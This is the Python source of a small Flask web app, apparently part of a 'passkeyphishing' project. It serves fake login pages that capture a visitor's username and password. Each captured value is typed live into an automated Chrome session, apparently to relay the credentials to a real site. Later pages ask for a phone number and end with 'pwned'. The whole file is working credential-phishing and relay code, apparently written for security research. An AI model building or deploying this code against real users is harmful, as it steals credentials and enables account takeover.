# Importing flask module in the project is mandatory
# An object of Flask class is our WSGI application.

from flask import Flask, request, redirect, url_for, render_template

from passkeyphishing.chrome import Chrome

# Flask constructor takes the name of
# current module (__name__) as argument.
app = Flask(__name__)


chrome_browser = Chrome()

# The route() function of the Flask class is a decorator,
# which tells the application which URL should call
# the associated function.
@app.route('/')
# ‘/’ URL is bound with hello_world() function.
def index():
    # Reset our Chrome
    # chrome_browser.restart_chrome()
    return render_template("index.html")


@app.post('/login')
def login():
    user = request.form['username']
    print(f"Got username {user}")
    chrome_browser.enter_text(user.encode())
    return render_template("password.html")
@app.post('/login2')
def login2():
    print(request.form)
    password = request.form['username']
    print(f"Got username {password}")
    chrome_browser.enter_text(password.encode())
    return """
    <form method="POST" action="/login3">
    <input type="text" name="phone number">
    <input type="submit" value="Continue">
    </form>"""

@app.post('/login3')
def login3():
    return """
    <form method="POST" action="/login4">
    <input type="text" name="phone number">
    <input type="submit" value="Continue">
    </form>"""

@app.post('/login4')
def login4():
    return """pwned"""

# main driver function
if __name__ == '__main__':

    # run() method of Flask class runs the application
    # on the local development server.
    app.run(debug=True)